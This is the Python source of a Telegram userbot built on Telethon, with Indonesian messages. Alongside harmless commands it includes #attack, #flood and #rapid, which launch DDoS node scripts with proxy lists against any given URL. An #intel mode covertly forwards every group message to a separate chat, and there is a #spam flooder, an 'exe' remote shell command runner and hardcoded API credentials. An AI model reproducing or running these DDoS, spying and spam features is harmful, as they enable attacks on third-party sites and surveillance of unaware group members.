import asyncio
from telethon import TelegramClient, events, utils, types
from telethon.tl.functions.messages import SendReactionRequest
from telethon.tl.types import DocumentAttributeFilename
from telethon.tl.types import ReactionEmoji
import time
import os
import subprocess
import requests
from telethon.tl.types import SendMessageTypingAction, SendMessageCancelAction
from telethon.tl.functions.messages import SetTypingRequest

api_id = 24415926  # masukkan API ID Anda di sini
api_hash = '568bf3210f4ae6541fa30818a8f9360c'  # masukkan API Hash Anda di sini
pixabay_api_key = '43029102-f1ce95c95d3b6751c0f11a569'
admin_id = 6803990183  # masukkan ID admin Anda di sini
forward_to_chat_id = -4220340084


client = TelegramClient('userbot_session', api_id, api_hash)

spy_active_chats = set()
reacting_users = {}
typing_active = {}
spamming = False

def is_admin(user_id):
    return user_id == admin_id

@client.on(events.NewMessage(pattern=r"#cp"))
async def copy_paste(event):
    if not is_admin(event.sender_id):
        return
    
    if event.is_reply:
        reply_message = await event.get_reply_message()
        if reply_message.message:
            code_message = f"```{reply_message.message}```"
            await event.edit(code_message)
        else:
            await event.reply("Yang Direply Bukan Sebuah Text")
    else:
        await event.reply("Gunakan Reply Pesan")


@client.on(events.NewMessage(pattern=r"#fake"))
async def start_typing(event):
    global typing_active
    if not is_admin(event.sender_id):
        return

    chat_id = event.chat_id
    typing_active[chat_id] = True
    await event.edit("Mode Fake Started ...")

    while typing_active.get(chat_id, False):
        await client(SetTypingRequest(peer=chat_id, action=SendMessageTypingAction()))
        await asyncio.sleep(5)

@client.on(events.NewMessage(pattern=r"#nofake"))
async def stop_typing(event):
    global typing_active
    if not is_admin(event.sender_id):
        return

    chat_id = event.chat_id
    typing_active[chat_id] = False
    await client(SetTypingRequest(peer=chat_id, action=SendMessageCancelAction()))
    await event.reply("Mode Fake Stop ...")


@client.on(events.NewMessage(pattern=r"#intel"))
async def spy_command(event):
    global spy_active_chats
    if not is_admin(event.sender_id):
        return

    chat_id = event.chat_id
    spy_active_chats.add(chat_id)
    await event.edit("Intel Active")

@client.on(events.NewMessage(pattern=r"#nointel"))
async def nospy_command(event):
    global spy_active_chats
    if not is_admin(event.sender_id):
        return

    chat_id = event.chat_id
    if chat_id in spy_active_chats:
        spy_active_chats.remove(chat_id)
        await event.edit("Intel mode deactivated.")

@client.on(events.NewMessage)
async def forward_messages(event):
    global spy_active_chats
    chat_id = event.chat_id
    if chat_id in spy_active_chats and event.is_group:
        # Skip forwarding commands
        if event.message.text and (event.message.text.startswith('#intel') or event.message.text.startswith('#nointel')):
            return
        await client.forward_messages(forward_to_chat_id, event.message)


@client.on(events.NewMessage(pattern='#id'))
async def handle_id(event):
    # Mendapatkan ID grup atau reply ID dari pesan
    chat_id = event.chat_id
    reply_id = event.message.reply_to_msg_id

    # Mendapatkan informasi pengirim pesan
    sender = await event.get_sender()

    # Mengecek apakah pengirim adalah admin
    if is_admin(sender.id):
        if reply_id:
            # Jika ada reply, tampilkan reply ID
            await event.respond(f'Reply ID: {reply_id}')
        else:
            # Jika tidak ada reply, tampilkan ID grup
            await event.respond(f'Group ID: {chat_id}')

@client.on(events.NewMessage(pattern=r'^#sent(?:\s+(.+))?$'))  # Handle #sent command
async def send_file(event):
    if not is_admin(event.sender_id):
        return

    file_name = event.pattern_match.group(1)

    if not file_name:
        await event.respond('Format yang salah! Gunakan #sent [nama file].')
        return

    try:
        with open(file_name, 'rb') as file:
            await client.send_file(event.chat_id, file)
        await event.respond('Berkas telah dikirim.')
    except FileNotFoundError:
        await event.respond('File tidak ditemukan.')
    except Exception as e:
        await event.respond(f'Gagal mengirim berkas: {str(e)}')


@client.on(events.NewMessage(pattern=r'^#download$'))  # Handle #download command
async def download_file(event):
    if not is_admin(event.sender_id):
        return

    if event.is_reply and event.reply_to_msg_id:
        try:
            reply_msg = await event.get_reply_message()
            if reply_msg.file:
                file_path = await client.download_media(reply_msg)
                await event.respond(f'Berkas telah diunduh')
            else:
                await event.respond('Pesan yang di-reply tidak mengandung berkas.')
        except Exception as e:
            await event.respond(f'Gagal mendownload berkas: {str(e)}')
    else:
        await event.respond('Silakan mereply pesan yang mengandung berkas untuk mendownload.')


@client.on(events.NewMessage(pattern=r'^#img(?:\s+(.+))?$'))  # Handle #img command
async def image_search(event):
    if not is_admin(event.sender_id):
        return

    search_query = event.pattern_match.group(1)

    if search_query is None:
        await event.respond('Format yang salah! Gunakan #img [search].')
        return

    try:
        file_path = await get_image_from_pixabay(search_query)
        if file_path:
            await client.send_file(event.chat_id, file=file_path)
            os.remove(file_path)
        else:
            await event.respond('Tidak ditemukan gambar.')
    except Exception as e:
        await event.respond(f'Gagal mendapatkan gambar: {str(e)}')


async def get_image_from_pixabay(search_query):
    url = f'https://pixabay.com/api/?key={pixabay_api_key}&q={search_query}'

    response = requests.get(url).json()

    if 'hits' in response:
        hits = response['hits']
        if len(hits) > 0:
            image_url = hits[0]['largeImageURL']
            image_content = requests.get(image_url).content
            file_path = os.path.join('temp', 'image.jpg')
            with open(file_path, 'wb') as file:
                file.write(image_content)
            return file_path

    return None


@client.on(events.NewMessage(pattern=r'^#top$'))  # Handle #top command
async def top_chats(event):
    if not is_admin(event.sender_id):
        return

    try:
        open_chats = await client.get_dialogs()

        unread_chats = [(c.name, c.unread_count) for c in open_chats if c.unread_count > 0]

        sorted_chats = sorted(unread_chats, key=lambda x: x[1], reverse=True)

        response = "Top 5 Chats Yang Belum Dibaca :\n\n"

        for idx, (chat_name, unread_count) in enumerate(sorted_chats[:5]):
            response += f"{idx+1}. {chat_name} - {unread_count} Belum Dibaca\n"

        await event.respond(response)

    except Exception as e:
        print(f"Error occurred while fetching chats: {str(e)}")


@client.on(events.NewMessage(pattern=r"#react\s*(.*)"))
async def react(event):
    if not is_admin(event.sender_id):
        return

    emoji = event.pattern_match.group(1).strip()
    
    if not event.is_reply:
        await event.reply("Replay chat user")
        return

    if not emoji:
        await event.reply("Format salah. Gunakan #react [emoji].")
        return

    replied_msg = await event.get_reply_message()
    user_id = replied_msg.sender_id

    reacting_users[user_id] = emoji
    await event.reply(f"react with {emoji}")

@client.on(events.NewMessage(pattern=r"#unreact"))
async def unreact(event):
    if not is_admin(event.sender_id):
        return

    if not event.is_reply:
        await event.reply("Reply chat orang bro")
        return

    replied_msg = await event.get_reply_message()
    user_id = replied_msg.sender_id

    if user_id in reacting_users:
        del reacting_users[user_id]
        await event.reply(f"Stop React {user_id}")
    else:
        await event.reply(f"Not found react {user_id}")

@client.on(events.NewMessage)
async def auto_react(event):
    if event.sender_id in reacting_users:
        emoji = reacting_users[event.sender_id]
        try:
            await client(SendReactionRequest(
                peer=event.peer_id,
                msg_id=event.id,
                reaction=[ReactionEmoji(emoticon=emoji)]
            ))
        except Exception as e:
            print(f"Failed to react: {str(e)}")


@client.on(events.NewMessage(pattern=r'^#spam (.*)( \d+)$'))  # Handle #spam command with message and count
async def spam(event):
    global spamming

    if not is_admin(event.sender_id):
        return

    if spamming:
        await event.respond('Sedang dalam proses spamming, gunakan #unspam untuk menghentikannya.')
        return

    args = event.pattern_match.groups()

    message = args[0]
    count = int(args[1])

    spamming = True

    for _ in range(count):
        if not spamming:
            break
        await client.send_message(event.chat_id, message)

    spamming = False


@client.on(events.NewMessage(pattern=r'^#unspam$'))  # Handle #unspam command
async def unspam(event):
    global spamming

    if not is_admin(event.sender_id):
        return

    spamming = False
    await event.respond('Spam berhasil dihentikan.')


@client.on(events.NewMessage(pattern=r'^#spam$'))  # Handle invalid #spam command
async def invalid_spam(event):
    await event.respond('Format yang salah! Gunakan #spam [pesan] [count] atau #unspam.')

@client.on(events.NewMessage(pattern=r'#attack( |$)'))
async def handle_attack(event):
    if not is_admin(event.sender_id):
        return

    if len(event.raw_text.split()) == 1:
        await event.reply('Format salah. Contoh penggunaan: #attack [url] [port] [time] [count]')
        return
    elif len(event.raw_text.split()) == 5:
        _, url, port, time, count = event.raw_text.split()
        cmd = f'screen -dm node attack.js {url} {time} 25 10 proxy.txt'
        for _ in range(int(count)):
            subprocess.run(cmd, shell=True)
        await event.reply(f'Attack Started\n\nTarget: {url}\nPort: {port}\nTime: {time}\nCount: {count}\n\n@sedihbetgw - FebryEnsz')
    else:
        await event.reply('Format salah. Contoh penggunaan: #attack [url] [port] [time] [count]')
        return

@client.on(events.NewMessage(pattern=r'#flood( |$)'))
async def handle_flood(event):
    if not is_admin(event.sender_id):
        return

    if len(event.raw_text.split()) == 1:
        await event.reply('Format salah. Contoh penggunaan: #flood [url] [port] [time] [count]')
        return
    elif len(event.raw_text.split()) == 5:
        _, url, port, time, count = event.raw_text.split()
        cmd = f'screen -dm node flood.js {url} {time} 25 10 proxy.txt'
        for _ in range(int(count)):
            subprocess.run(cmd, shell=True)
        await event.reply(f'Flood Attack Started\n\nTarget: {url}\nPort: {port}\nTime: {time}\nCount: {count}\n\n@sedihbetgw - FebryEnsz')
    else:
        await event.reply('Format salah. Contoh penggunaan: #flood [url] [port] [time] [count]')
        return

@client.on(events.NewMessage(pattern=r'#rapid( |$)'))
async def handle_flood(event):
    if not is_admin(event.sender_id):
        return

    if len(event.raw_text.split()) == 1:
        await event.reply('Format salah. Contoh penggunaan: #rapid [url] [port] [time] [count]')
        return
    elif len(event.raw_text.split()) == 5:
        _, url, port, time, count = event.raw_text.split()
        cmd = f'screen -dm node rapid.js bypass {time} 8 proxy.txt 25 {url}'
        for _ in range(int(count)):
            subprocess.run(cmd, shell=True)
        await event.reply(f'Rapid-Bypass Attack Started\n\nTarget: {url}\nPort: {port}\nTime: {time}\nCount: {count}\n\n@sedihbetgw - FebryEnsz')
    else:
        await event.reply('Format salah. Contoh penggunaan: #rapid [url] [port] [time] [count]')
        return

@client.on(events.NewMessage(pattern=r'#stop'))
async def handle_stop(event):
    if not is_admin(event.sender_id):
        return

    subprocess.run('killall screen', shell=True)
    await event.reply('All Attack Has Stop')

@client.on(events.NewMessage(pattern=r'^#alive$'))  # Handle #ping command
async def ping(event):
    start_time = time.time()

    message = await client.send_message(event.chat_id, 'I Am Alive ...')
    end_time = time.time()

    elapsed_time = (end_time - start_time) * 1000

    await message.edit(f'I Am Alive\nPing: {elapsed_time:.3f} ms')

@client.on(events.NewMessage(pattern=r'exe( |$)'))
async def handle_exe(event):
    if not is_admin(event.sender_id):
        return

    if len(event.raw_text.split()) == 1:
        await event.reply('Format salah. Contoh penggunaan: exe [command]')
        return
    else:
        _, command = event.raw_text.split(maxsplit=1)
        output = subprocess.getoutput(command)
        await event.reply(f'Output:\n\n{output}')


async def main():
    await client.start()
    await client.run_until_disconnected()

if __name__ == '__main__':
    os.makedirs('temp', exist_ok=True)
    client.loop.run_until_complete(main())